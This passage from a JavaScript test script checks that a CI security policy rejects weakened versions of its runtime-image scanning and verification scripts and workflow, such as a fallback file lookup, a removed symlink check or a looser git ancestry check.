      '/usr/app/bundle-input-dependencies.cdx.json \\\n',
      '/usr/app/packages/indexer/dist/bundle-input-dependencies.cdx.json \\\n'
    ),
  'bundle-input evidence must be generated once'
);

assertRejected(
  'fallback bundle-input evidence lookup',
  (root) =>
    replace(
      join(root, '.github/scripts/scan-runtime-image.sh'),
      '  docker cp \\\n',
      '  find /usr/app -name bundle-input-dependencies.cdx.json\n' +
        '  docker cp \\\n'
    ),
  'without fallback lookup'
);

assertRejected(
  'runtime verifier omits the exact bundle-input path assertion',
  (root) =>
    replace(
      join(root, '.github/scripts/verify-runtime-image.sh'),
      '      test "$bundle_input_paths" = "$bundle_input_path"\n',
      ''
    ),
  'source must exactly match the reviewed policy digest'
);

assertRejected(
  'runtime verifier accepts a symlinked bundle-input inventory',
  (root) =>
    replace(
      join(root, '.github/scripts/verify-runtime-image.sh'),
      '      test ! -L "$bundle_input_path"\n',
      ''
    ),
  'source must exactly match the reviewed policy digest'
);

assertRejected(
  'runtime digest scan without protected dev ancestry',
  (root) =>
    replace(
      join(root, '.github/workflows/runtime-image-security.yml'),
      '          git -C policy merge-base --is-ancestor "$EXPECTED_REVISION" HEAD',
      '          git -C policy cat-file -e "${EXPECTED_REVISION}^{commit}"'
    ),
  'source must exactly match the reviewed workflow digest'
);

console.log('Workflow policy negative probes passed.');
